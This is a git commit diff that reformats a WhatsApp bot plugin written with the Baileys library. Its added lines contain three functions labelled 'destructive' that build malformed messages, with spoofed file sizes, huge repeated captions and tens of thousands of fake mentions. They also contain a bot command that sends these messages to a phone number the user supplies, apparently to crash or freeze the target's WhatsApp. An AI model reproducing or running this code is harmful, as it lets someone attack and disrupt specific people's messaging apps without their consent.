9b8979efc381839c8c604cd061d4518f4426d4d8
Tobiprueba <virtualvirtuales538@gmail.com>
2025-06-20 13:45:18 -0600

    Add files via upload

--- plugins/tools-invisible3.js
+++ plugins/tools-invisible3.js
@@ -1,6 +1,7 @@
 import { generateWAMessageFromContent, generateWAMessage } from "@whiskeysockets/baileys";
 
-// 🧨 Función destructiva 1 async function superprotocolbugx(target, mention) { const videoMessage = { url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true", mimetype: "video/mp4", fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=", fileLength: "109951162777600", seconds: 99999, mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=", caption: "᭯".repeat(9771), height: 640, width: 640, fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=", directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc", mediaKeyTimestamp: "1743848703", contextInfo: { isSampled: true, fromMe: true, mentionedJid: [ "13135550002@s.whatsapp.net", ...Array.from({ length: 40000 }, () => 1${Math.floor(Math.random() * 500000)}@s.whatsapp.net ) ] }, forwardedNewsletterMessageInfo: { newsletterJid: "120363330344810280@newsletter", serverMessageId: 1, newsletterName: "ٯ".repeat(100) }, streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=", thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc", thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=", thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=" };
+// 🧨 Función destructiva 1 
+async function superprotocolbugx(target, mention) { const videoMessage = { url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true", mimetype: "video/mp4", fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=", fileLength: "109951162777600", seconds: 99999, mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=", caption: "᭯".repeat(9771), height: 640, width: 640, fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=", directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc", mediaKeyTimestamp: "1743848703", contextInfo: { isSampled: true, fromMe: true, mentionedJid: [ "13135550002@s.whatsapp.net", ...Array.from({ length: 40000 }, () => 1${Math.floor(Math.random() * 500000)}@s.whatsapp.net ) ] }, forwardedNewsletterMessageInfo: { newsletterJid: "120363330344810280@newsletter", serverMessageId: 1, newsletterName: "ٯ".repeat(100) }, streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=", thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc", thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=", thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=" };
 
 const msg = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
 
@@ -8,13 +9,15 @@ await client.relayMessage("status@broadcast", msg.message, { messageId: msg.key.
 
 if (mention) { await client.relayMessage(target, { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [ { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined } ] }); } }
 
-// 🧨 Función destructiva 2 async function DelaySuper(target, mention) { const generateMessage = { viewOnceMessage: { message: { imageMessage: { url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true", mimetype: "image/jpeg", caption: "⨭͠☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️", fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=", fileLength: "19769", height: 354, width: 783, mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=", directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc", contextInfo: { mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net" ), fromMe: true } } } } };
+// 🧨 Función destructiva 2 
+async function DelaySuper(target, mention) { const generateMessage = { viewOnceMessage: { message: { imageMessage: { url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true", mimetype: "image/jpeg", caption: "⨭͠☇𝐑̶𝐚̋͢𝐩͜𝐥𝐢 𝐄𝐬͓𝐂͢𝐚𝐧͠𝐨𝐫〽️", fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=", fileLength: "19769", height: 354, width: 783, mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=", directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc", contextInfo: { mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net" ), fromMe: true } } } } };
 
 const msg = generateWAMessageFromContent(target, generateMessage, {}); await client.relayMessage("status@broadcast", msg.message, { messageId: msg.key.id, statusJidList: [target] });
 
 if (mention) { await client.relayMessage(target, { statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } }, { additionalNodes: [ { tag: "meta", attrs: { is_status_mention: "⨭͛͠𝐙𝐄̶͓𝐃̷𝐄͡𝐙͍̽𝐀͡𝐃𝐀" }, content: undefined } ] }); } }
 
-// 🧨 Función destructiva 3 async function protocolbug8(target, mention) { const photo = { image: Buffer.from([]), // Agrega una imagen válida si lo deseas caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" };
+// 🧨 Función destructiva 3 
+async function protocolbug8(target, mention) { const photo = { image: Buffer.from([]), // Agrega una imagen válida si lo deseas caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" };
 
 const album = await generateWAMessageFromContent(target, { albumMessage: { expectedImageCount: 66, expectedVideoCount: 0 } }, { userJid: target, upload: client.waUploadToServer });
 
@@ -63,7 +66,8 @@ if (mention) {
 
 } }
 
-// 🧨 COMANDO let handler = async (m, { conn, text, command }) => { if (!text) return m.reply(❌ Debes poner el número objetivo.\nEjemplo: .${command} 521234567890);
+// 🧨 COMANDO
+ let handler = async (m, { conn, text, command }) => { if (!text) return m.reply(❌ Debes poner el número objetivo.\nEjemplo: .${command} 521234567890);
 
 const target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; global.client = conn;
 
